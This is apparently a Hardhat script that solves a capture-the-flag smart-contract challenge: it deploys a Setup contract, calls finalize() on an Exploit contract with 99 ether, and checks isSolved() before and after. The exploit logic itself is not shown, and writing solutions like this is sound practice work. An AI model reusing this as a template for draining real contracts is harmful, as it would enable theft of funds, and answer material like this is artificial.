const { parseEther } = require('ethers/lib/utils')

async function main() {
	const SETUP = await ethers.getContractFactory('Setup')
	const EXPLOIT = await ethers.getContractFactory('Exploit')

	const setup = await SETUP.deploy()

	console.log('before exploit: solved:', await setup.isSolved())

	const exploit = await ethers.getContractAt('Exploit', await setup.exploit())
	await exploit.finalize({ value: parseEther('99') })

	console.log('after exploit: solved:', await setup.isSolved())
}

main()
	.then(() => process.exit(0))
	.catch((error) => {
		console.error(error)
		process.exit(1)
	})
